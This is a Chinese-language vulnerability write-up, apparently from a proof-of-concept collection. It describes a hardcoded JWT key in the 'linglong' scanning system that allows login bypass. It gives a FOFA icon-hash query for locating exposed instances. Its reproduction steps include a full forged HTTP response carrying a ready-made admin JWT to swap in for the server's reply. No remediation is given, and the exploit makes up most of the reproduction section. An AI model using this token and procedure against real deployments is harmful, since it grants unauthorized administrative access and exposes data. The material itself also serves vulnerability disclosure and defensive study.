# linglong扫描系统存在JWT密钥硬编码登录绕过漏洞

# 一、漏洞简介
linglong扫描系统 存在密钥硬编码漏洞，未经身份验证验证得攻击者可构造JWT密钥绕着身份认证直接登录系统后台，造成信息泄露，使系统处于极不安全的状态。

# 二、影响版本
+ linglong扫描系统

# 三、资产测绘
+ fofa`icon_hash="684115083"`
+ 特征![1715938593763-5eb42a99-7424-48f3-9a08-2a19f8d41a80.png](./img/TdJAfNn7rXunQrWH/1715938593763-5eb42a99-7424-48f3-9a08-2a19f8d41a80-600755.png)

# 四、漏洞复现
1、登陆时抓包

![1715938889113-723830d7-8a12-4e5b-b91e-6543f792e612.jpeg](./img/TdJAfNn7rXunQrWH/1715938889113-723830d7-8a12-4e5b-b91e-6543f792e612-800818.jpeg)

2、拦截返回包

![1715938893647-287318dd-1f8b-4da2-81a3-7ee9b1bcd887.jpeg](./img/TdJAfNn7rXunQrWH/1715938893647-287318dd-1f8b-4da2-81a3-7ee9b1bcd887-481183.jpeg)

3、替换返回包为如下内容：

![1715938907183-713ef226-8b05-487e-a848-14919f3f7be4.jpeg](./img/TdJAfNn7rXunQrWH/1715938907183-713ef226-8b05-487e-a848-14919f3f7be4-695767.jpeg)

```plain
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type,AccessToken,X-CSRF-Token, Authorization,Token,X-TOKEN
Access-Control-Allow-Methods: POST, GET,PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: *
Access-Control-Expose-Headers: Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Content-Type
Content-Type: application/json; charset=utf-8
Date: Fri, 17 May 2024 09:39:26 GMT
Content-Length: 43
Connection: close

{"code":200,"data":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwiZXhwIjoxOTk5OTk5OTk5LCJpc3MiOiJsaW5nbG9uZyJ9.xAJf-cktK9WD5vXpfwTaIs6fSqVGZfG5BGnqDZwruMY"},"msg":"请求失败"}
```

![1715938718868-db511db4-0fa4-4453-b8a0-37ae18e96300.png](./img/TdJAfNn7rXunQrWH/1715938718868-db511db4-0fa4-4453-b8a0-37ae18e96300-390634.png)



> 更新: 2024-05-18 12:32:23  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pb37q4h4d15zfwg1>